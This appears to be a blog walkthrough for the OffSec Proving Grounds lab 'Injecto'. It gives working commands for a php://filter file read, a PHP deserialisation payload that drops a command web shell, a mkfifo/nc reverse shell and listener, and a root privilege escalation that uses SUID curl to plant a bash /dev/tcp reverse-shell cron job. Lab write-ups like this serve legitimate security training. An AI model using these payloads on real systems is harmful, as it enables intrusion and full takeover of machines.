---
title: Injecto
date: 2026-05-20T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - SUID
  - Caido
  - php
  - base64
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Injecto"
---
"The problem with people who have no vices is that generally you can be pretty sure they're going to have some pretty annoying virtues"  
― Elizabeth Taylor

nmap -p- 192.168.153.173 --min-rate 5000

![](Screenshot%202026-05-20%20at%2017.38.03.png)

![](Screenshot%202026-05-20%20at%2017.37.38.png)

![](Screenshot%202026-05-20%20at%2017.39.43.png)

![](Screenshot%202026-05-20%20at%2017.40.55.png)

![](Screenshot%202026-05-20%20at%2017.55.36.png)

![](Screenshot%202026-05-20%20at%2018.01.32.png)

![](Screenshot%202026-05-20%20at%2018.03.33.png)

I tried this new vul: https://github.com/DepthFirstDisclosures/Nginx-Rift/blob/main/poc.py

https://routezero.security/2024/11/20/proving-grounds-practice-injecto-walkthrough/  
https://rouvin.gitbook.io/ibreakstuff/writeups/proving-grounds-practice/linux/injecto

I struggled to find the right directions for this. I was fixated on this:  
![](Screenshot%202026-05-21%20at%2015.22.43.png)
![](Screenshot%202026-05-21%20at%2015.22.27.png)

I tried to connect to mysql with the r1pp3r6944 username but found nothing. 

What I needed to do was read the source code and discover there is a deserialisation vulnerability. 

![](Screenshot%202026-05-21%20at%2015.30.18.png)

Trying to read the source code:  
`curl http://192.168.193.173/?page=php://filter/convert.base64-encode/resource=blackdeath`

![](Screenshot%202026-05-21%20at%2015.32.17.png)

`curl http://192.168.193.173/?page=php://filter/convert.base64-encode/resource=blackdeath../../../../../var/www/html/index  `

![](Screenshot%202026-05-21%20at%2015.34.11.png)

`http://192.168.193.173/index.php?page=php://filter/convert.base64-encode/resource=blackdeath../../../../../usr/share/nginx/html/index`

![](Screenshot%202026-05-21%20at%2015.39.14.png)

`echo "enter the data here" | base64` 

![](Screenshot%202026-05-21%20at%2015.42.41.png)

![](Screenshot%202026-05-21%20at%2015.43.35.png)

I think this would have been a lot easier if the website wans't broken and we could fill out the for and see the requests using Caido....

![](Screenshot%202026-05-21%20at%2015.46.08.png)

By using this syntax:  
`O:7:"MyClass":2:{s:9:"form_file";s:8:"test.php";s:4:"msgo";s:29:"<?php+system($_GET['cmd']);?>";}`

We can create this command:  
`curl "http://192.168.183.173:8080/index.php?values_submit=O:7:%22MyClass%22:2:%7Bs:9:%22form_file%22;s:8:%22test.php%22;s:4:%22msgo%22;s:29:%22%3C?php+system(\$_GET%5B'cmd'%5D);?%3E%22;%7D"`

`curl http://192.168.193.173:8080/test.php?cmd=id`

![](Screenshot%202026-05-21%20at%2016.12.41.png)
![](Screenshot%202026-05-21%20at%2016.13.57.png)

Start you listener:
rlwrap nc -lvnp 1337

![](Screenshot%202026-05-21%20at%2016.17.38.png)

![](Screenshot%202026-05-21%20at%2016.18.03.png)

 Or:

`curl http://192.168.193.173:8080/test.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.166%201337%20%3E%2Ftmp%2Ff`

![](Screenshot%202026-05-21%20at%2016.19.47.png)


Escalation:
Straight away I looked for SUID persmissions.  
`find / -perm -u=s 2>/dev/null`

Because the SUID of curl we can transfer data into a file with elevated privileges. 

![](Screenshot%202026-05-21%20at%2014.36.58.png)

https://gtfobins.org/gtfobins/curl/#upload

![](Screenshot%202026-05-21%20at%2014.24.12.png)

I tried a few different things but realised the easiest way was to overwrite an existing cron.d file.

This command will give initiate the cronjob every minute:  
`echo "* * * * * root /bin/bash -c "bash -i >& /dev/tcp/192.168.45.166/1234 0>&1"" > tmp-file`

If you have issues with this, create a file in kali and transfer it to the machine using curl or wget.

![](Screenshot%202026-05-21%20at%2014.30.04.png)

Start your listener:  
`rlwrap nc -lvnp 1234`

This will command overwrite the contents of the file without changing the permissions:  
`curl file:///usr/share/nginx/html/injecto-cron.sh -o /etc/cron.d/popularity-contest`

![](Screenshot%202026-05-21%20at%2014.23.50.png)

